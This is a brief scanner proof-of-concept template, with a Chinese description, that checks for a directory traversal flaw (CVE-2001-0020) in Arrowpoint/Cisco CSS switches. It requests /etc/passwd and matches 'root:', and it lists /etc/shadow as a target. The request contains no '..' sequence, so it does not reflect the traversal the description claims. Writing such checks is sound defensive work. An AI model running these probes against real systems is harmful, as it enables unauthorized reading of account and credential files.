[info]
author = "ave"
description = "Arrowpoint 内容服务交换机存在目录遍历漏洞，攻击者可通过 .. (dot dot) 攻击绕过路径验证，读取任意文件。漏洞影响 Cisco CSS 设备，攻击者无需权限即可访问敏感文件，如 /etc/passwd、/etc/shadow、应用配置文件等。"
id = "POC-AVE-2001-0579"
name = "CVE-2001-0020 目录遍历任意文件读取漏洞 PoC"
severity = "low"
tags = ["ave-2001-0579"]
vuln_id = [
    "CVE-2001-0020",
    "AVE-2001-0579",
]

[poc]
logic = "all"

[[poc.requests]]
path = "/etc/passwd"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
